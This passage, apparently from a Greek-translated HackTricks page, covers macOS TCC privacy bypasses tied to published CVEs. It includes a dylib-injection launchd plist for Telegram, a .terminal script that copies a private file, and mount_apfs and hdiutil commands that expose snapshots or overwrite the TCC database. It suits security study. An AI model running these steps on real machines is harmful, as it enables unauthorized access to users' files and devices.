Το Telegram είχε τα entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** και **`com.apple.security.cs.disable-library-validation`**, οπότε ήταν δυνατό να γίνει κατάχρηση αυτών για **να αποκτηθεί πρόσβαση στα δικαιώματά του**, όπως η εγγραφή με την κάμερα. Μπορείτε να [**βρείτε το payload στο writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Σημειώστε ότι για τη χρήση της μεταβλητής env ώστε να φορτωθεί μια library, δημιουργήθηκε ένα **custom plist** για την εισαγωγή αυτής της library και χρησιμοποιήθηκε το **`launchctl`** για την εκκίνησή της:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Μέσω κλήσεων του open

Είναι δυνατό να γίνει κλήση του **`open`** ακόμη και όταν υπάρχει sandbox

### Σενάρια Terminal

Είναι αρκετά συνηθισμένο να παρέχεται **Πλήρης Πρόσβαση στον Δίσκο (FDA)** στο Terminal, τουλάχιστον σε υπολογιστές που χρησιμοποιούνται από άτομα της τεχνολογίας. Είναι επίσης δυνατό να κληθούν σενάρια **`.terminal`** μέσω αυτού.

Τα σενάρια **`.terminal`** είναι αρχεία plist όπως το παρακάτω, με την εντολή προς εκτέλεση στο κλειδί **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Μια εφαρμογή θα μπορούσε να γράψει ένα script τερματικού σε μια τοποθεσία όπως το /tmp και να το εκκινήσει με μια εντολή όπως:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Με προσάρτηση

### CVE-2020-9771 - παράκαμψη TCC και κλιμάκωση προνομίων μέσω mount_apfs

**Οποιοσδήποτε χρήστης** (ακόμα και μη προνομιούχοι) μπορεί να δημιουργήσει και να προσαρτήσει ένα στιγμιότυπο Time Machine και να αποκτήσει πρόσβαση σε **ΟΛΑ τα αρχεία** αυτού του στιγμιότυπου.\
Η **μόνη απαιτούμενη προϋπόθεση** είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει πρόσβαση **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), η οποία πρέπει να παραχωρηθεί από διαχειριστή.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Μια πιο λεπτομερής εξήγηση [**υπάρχει στην αρχική αναφορά**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount πάνω από αρχείο TCC

Ακόμα κι αν το αρχείο της TCC DB προστατευόταν, ήταν δυνατό να γίνει **mount πάνω από τον κατάλογο** ενός νέου αρχείου TCC.db:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Δείτε το **πλήρες exploit** στο [**αρχικό writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Όπως εξηγείται στο [αρχικό writeup](https://www.kandji.io/blog/macos-audit-story-part2), αυτό το CVE εκμεταλλευόταν το `diskarbitrationd`.<sup>[[16]](#references)</sup>

Η συνάρτηση `DADiskMountWithArgumentsCommon` του δημόσιου framework `DiskArbitration` εκτελούσε τους ελέγχους ασφαλείας. Ωστόσο, ήταν δυνατό να παρακαμφθεί καλώντας απευθείας το `diskarbitrationd` και, επομένως, να χρησιμοποιηθούν στοιχεία `../` στη διαδρομή και symlinks.

Αυτό επέτρεπε σε έναν attacker να κάνει mounts σε οποιαδήποτε τοποθεσία, ακόμη και πάνω από τη βάση δεδομένων TCC, λόγω του entitlement `com.apple.private.security.storage-exempt.heritable` του `diskarbitrationd`.

### asr

Το εργαλείο **`/usr/sbin/asr`** επέτρεπε την αντιγραφή ολόκληρου του δίσκου και το mount του σε άλλη τοποθεσία, παρακάμπτοντας τις προστασίες TCC.

### CVE-2022-22655 - Υπηρεσίες τοποθεσίας

Οι Υπηρεσίες τοποθεσίας **δεν** αποθηκεύονται σε βάση δεδομένων TCC όπως οι άλλες υπηρεσίες. Τις διαχειρίζεται το `locationd`, το οποίο διατηρεί τη δική του λίστα επιτρεπόμενων στο **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Κάθε εγγραφή είναι καταχωρισμένη με βάση τον client (bundle ID ή διαδρομή εκτελέσιμου αρχείου) και περιλαμβάνει πεδία όπως `Authorized`, `BundleId`, `Executable` και `Registered`.<sup>[[4]](#references)</sup>

Το ίδιο το αρχείο `clients.plist` προστατεύεται από το Sandbox/TCC και δεν μπορεί να τροποποιηθεί ακόμη και ως root — όμως ο κατάλογος **`/var/db/locationd/` δεν προστατευόταν από την προσάρτηση**. Έτσι, ένας attacker με δικαιώματα root μπορούσε να δημιουργήσει ένα disk image που περιείχε το δικό του `clients.plist` (με το binary του σημειωμένο ως `Authorized`), να το προσαρτήσει πάνω από τον κατάλογο και να επανεκκινήσει το `locationd`, ώστε να εφαρμοστεί η πλαστή allow-list.<sup>[[3]](#references)</sup>

> [!TIP]
> Αυτό ακολουθεί το ίδιο μοτίβο με τα παραπάνω TCC bypasses μέσω `hdiutil`/`mount`: το *αρχείο* προστατεύεται, αλλά ο *κατάλογος όπου βρίσκεται* όχι, οπότε αντικαθιστάτε ολόκληρο τον κατάλογο αντί για το αρχείο.

## Μέσω εφαρμογών εκκίνησης


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Μέσω grep

Σε αρκετές περιπτώσεις, αρχεία αποθηκεύουν ευαίσθητες πληροφορίες, όπως email, αριθμούς τηλεφώνου, μηνύματα... σε μη προστατευμένες τοποθεσίες (κάτι που θεωρείται ευπάθεια από την Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Αυτό δεν λειτουργεί πλέον, αλλά [**λειτουργούσε παλαιότερα**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Ένας άλλος τρόπος είναι η χρήση [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

- [1] [CVE-2020–9934: Παράκαμψη του macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Παράκαμψη των προστασιών απορρήτου χρηστών του macOS TCC, κατά λάθος και εκ προθέσεως](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Παράκαμψη των Location Services του TCC (αρχική αναφορά)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Πού στον κόσμο βρίσκεται η Carmen Sandiego: Κατάχρηση των Location Services στο macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass κλέβει δεδομένα από το iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (μεταβλητές περιβάλλοντος SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Entitlement για την αποδοχή μεταβλητών περιβάλλοντος DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: το hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-Day TCC bypass εντοπίστηκε στο malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: «Ό,τι συμβαίνει στο Mac σας, μένει στο iCloud της Apple;!» - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Νέα ευπάθεια στο macOS, «powerdir», θα μπορούσε να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση σε δεδομένα χρηστών](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Αλλαγή του home directory και παράκαμψη του TCC, γνωστό και ως CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Αναπαραγωγή μουσικής και παράκαμψη του TCC, γνωστό και ως CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Πώς να κλέψετε μια (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Παράκαμψη του TCC με το Telegram στο macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Αποκάλυψη ευπαθειών της Apple: έλεγχος των diskarbitrationd και storagekitd, Μέρος 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Ορισμός μεταβλητών περιβάλλοντος στο OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: Παράκαμψη TCC και privilege escalation μέσω mount_apfs](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: Παράκαμψη TCC με προσάρτηση πάνω από τη βάση δεδομένων TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [20+ τρόποι παράκαμψης των μηχανισμών απορρήτου του macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Μεγάλη νίκη κατά του TCC - 20+ ΝΕΟΙ τρόποι παράκαμψης των μηχανισμών απορρήτου του MacOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Από το Spotlight στο Apple Intelligence — Κατάχρηση ενός 0day για την κλοπή των δεδομένων που τροφοδοτούν το macOS AI](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
